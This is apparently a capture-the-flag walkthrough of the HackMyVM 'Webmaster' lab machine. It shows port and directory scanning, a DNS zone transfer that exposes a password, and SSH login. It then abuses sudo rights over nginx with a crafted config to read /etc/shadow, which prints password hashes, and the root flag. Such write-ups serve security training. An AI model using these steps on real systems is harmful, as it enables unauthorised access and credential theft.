# Webmaster

## Information

## Solution

### Enumeration
#### Nmap Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.29
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 14:39 +07
Nmap scan report for 10.11.5.29
Host is up (0.0061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:46:F7:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.88 seconds
```
![web](/walkthroughs/hackmyvm/machines/beginner/Webmaster/web.png)

#### Directory Enumeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.11.5.29/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.11.5.29/
 🚩  In-Scope Url          │ 10.11.5.29
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1678l    10043w   845816c http://10.11.5.29/comic.png
200      GET        2l        4w       57c http://10.11.5.29/
[####################] - 6m    220546/220546  0s      found:2       errors:0      
[####################] - 6m    220545/220545  652/s   http://10.11.5.29/ 

┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.100.154/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.154/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 57]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

#### Web Server Enumeration

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -i "http://192.168.100.154"
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 25 May 2026 08:36:57 GMT
Content-Type: text/html
Content-Length: 57
Last-Modified: Sat, 05 Dec 2020 09:48:55 GMT
Connection: keep-alive
ETag: "5fcb5787-39"
Accept-Ranges: bytes

 <img src="comic.png" alt="comic"> 
<!--webmaster.hmv-->
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://192.168.100.154
 <img src="comic.png" alt="comic"> 
<!--webmaster.hmv-->
```


### Initial Access
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo '192.168.100.154 webmaster.hmv' | sudo tee -a /etc/hosts
192.168.100.154 webmaster.hmv
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat /etc/hosts | grep webmaster
192.168.100.154 webmaster.hmv
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ dig axfr webmaster.hmv @192.168.100.154

; <<>> DiG 9.20.15-2-Debian <<>> axfr webmaster.hmv @192.168.100.154
;; global options: +cmd
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.
ftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.
john.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"
mail.webmaster.hmv.     604800  IN      A       192.168.0.12
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1
www.webmaster.hmv.      604800  IN      A       192.168.0.11
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 24 msec
;; SERVER: 192.168.100.154#53(192.168.100.154) (TCP)
;; WHEN: Mon May 25 15:43:01 +07 2026
;; XFR size: 8 records (messages 1, bytes 274)
```
We see `john.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"` 

#### SSH Access
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh john@192.168.100.154
The authenticity of host '192.168.100.154 (192.168.100.154)' can't be established.
ED25519 key fingerprint is: SHA256:Pc29l65Be7facFkvVvZRZLlHBJBvwLH5bOciipZXstQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.154' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
john@192.168.100.154's password: 
Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec  5 05:38:56 2020 from 192.168.1.58
john@webmaster:~$ id; hostname
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
webmaster
```
#### Flags (user.txt)
```bash
john@webmaster:~$ ls
flag.sh  user.txt
john@webmaster:~$ cat user.txt 
HMVdnsyo
```
### Privilege Escalation
#### Sudo Enumeration
```bash
john@webmaster:~$ ls -la
total 36
drwxr-xr-x 3 john john 4096 Dec  5  2020 .
drwxr-xr-x 3 root root 4096 Dec  4  2020 ..
-rw-r--r-- 1 john john  220 Dec  4  2020 .bash_logout
-rw-r--r-- 1 john john 3526 Dec  4  2020 .bashrc
-rwxr-xr-x 1 john john 1920 Dec  5  2020 flag.sh
drwxr-xr-x 3 john john 4096 Dec  5  2020 .local
-rw-r--r-- 1 john john  807 Dec  4  2020 .profile
-rw------- 1 john john    9 Dec  5  2020 user.txt
-rw------- 1 john john  110 Dec  5  2020 .Xauthority
john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

#### Abuse
```bash
john@webmaster:/tmp$ nano evil_nginx.conf
john@webmaster:/tmp$ cat evil_nginx.conf 
user root;
worker_processes 1;
pid /tmp/nginx.pid;  
error_log /tmp/nginx_error.log;

events {
        worker_connections 1024;
}
 
http {
        server {
                listen 4444;
                root /;
                autoindex on;

                location / {
                }
        }
}
john@webmaster:/tmp$ sudo /usr/sbin/nginx -c /tmp/evil_nginx.conf
john@webmaster:/tmp$ curl http://localhost:4444/etc/shadow
-bash: curl: command not found
john@webmaster:/tmp$ wget -q -O - http://localhost:4444/etc/shadow
root:$6$zncDavtVRmUD0pQg$/YQx2Q7DIeog3I7I4FKAzf3Y5sZvcOjU84JcyiuboB7hP21EpijheWcmhH0wrFESREBp91pnI9LtdrLUO8OTn0:18601:0:99999:7:::
daemon:*:18600:0:99999:7:::
bin:*:18600:0:99999:7:::
sys:*:18600:0:99999:7:::
sync:*:18600:0:99999:7:::
games:*:18600:0:99999:7:::
man:*:18600:0:99999:7:::
lp:*:18600:0:99999:7:::
mail:*:18600:0:99999:7:::
news:*:18600:0:99999:7:::
uucp:*:18600:0:99999:7:::
proxy:*:18600:0:99999:7:::
www-data:*:18600:0:99999:7:::
backup:*:18600:0:99999:7:::
list:*:18600:0:99999:7:::
irc:*:18600:0:99999:7:::
gnats:*:18600:0:99999:7:::
nobody:*:18600:0:99999:7:::
_apt:*:18600:0:99999:7:::
systemd-timesync:*:18600:0:99999:7:::
systemd-network:*:18600:0:99999:7:::
systemd-resolve:*:18600:0:99999:7:::
messagebus:*:18600:0:99999:7:::
john:$6$DiPfbtLNSlIqjBs5$EJO2mGyso/jyUPY1hTXbMB8kFfNcKW5ijJIRFribgaw.O8ukOfnab.Wv6TcB6r1jrIPNnpIkI8hz0Z/E5MjfT/:18601:0:99999:7:::
systemd-coredump:!!:18600::::::
sshd:*:18600:0:99999:7:::
bind:*:18600:0:99999:7:::
```
```bash
john@webmaster:/tmp$ wget -q -O - http://localhost:4444/
<html>
<head><title>Index of /</title></head>
<body bgcolor="white">
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               04-Dec-2020 20:17                   -
<a href="boot/">boot/</a>                                              04-Dec-2020 20:04                   -
<a href="dev/">dev/</a>                                               09-Jun-2026 07:27                   -
<a href="etc/">etc/</a>                                               09-Jun-2026 07:27                   -
<a href="home/">home/</a>                                              04-Dec-2020 20:04                   -
<a href="lib/">lib/</a>                                               04-Dec-2020 20:17                   -
<a href="lib32/">lib32/</a>                                             04-Dec-2020 19:59                   -
<a href="lib64/">lib64/</a>                                             04-Dec-2020 19:59                   -
<a href="libx32/">libx32/</a>                                            04-Dec-2020 19:59                   -
<a href="lost%2Bfound/">lost+found/</a>                                        04-Dec-2020 19:59                   -
<a href="media/">media/</a>                                             04-Dec-2020 19:59                   -
<a href="mnt/">mnt/</a>                                               04-Dec-2020 19:59                   -
<a href="opt/">opt/</a>                                               04-Dec-2020 19:59                   -
<a href="proc/">proc/</a>                                              09-Jun-2026 07:27                   -
<a href="root/">root/</a>                                              05-Dec-2020 09:50                   -
<a href="run/">run/</a>                                               09-Jun-2026 07:49                   -
<a href="sbin/">sbin/</a>                                              04-Dec-2020 20:17                   -
<a href="srv/">srv/</a>                                               04-Dec-2020 19:59                   -
<a href="sys/">sys/</a>                                               09-Jun-2026 07:27                   -
<a href="tmp/">tmp/</a>                                               09-Jun-2026 08:39                   -
<a href="usr/">usr/</a>                                               04-Dec-2020 19:59                   -
<a href="var/">var/</a>                                               04-Dec-2020 20:17                   -
<a href="initrd.img">initrd.img</a>                                         04-Dec-2020 20:02            25843579
<a href="initrd.img.old">initrd.img.old</a>                                     04-Dec-2020 20:02            25815961
<a href="vmlinuz">vmlinuz</a>                                            18-Oct-2020 08:43             5278960
<a href="vmlinuz.old">vmlinuz.old</a>                                        07-Jun-2020 15:42             5274864
</pre><hr></body>
</html>
john@webmaster:/tmp$ wget -q -O - http://localhost:4444/root
<html>
<head><title>Index of /root/</title></head>
<body bgcolor="white">
<h1>Index of /root/</h1><hr><pre><a href="../">../</a>
<a href="flag.sh">flag.sh</a>                                            05-Dec-2020 09:49                1920
<a href="root.txt">root.txt</a>                                           05-Dec-2020 09:50                  13
</pre><hr></body>
</html>
```

#### Flags
```bash
john@webmaster:/tmp$ wget -q -O - http://localhost:4444/root/root.txt
HMVnginxpwnd
```

***You are welcome!***
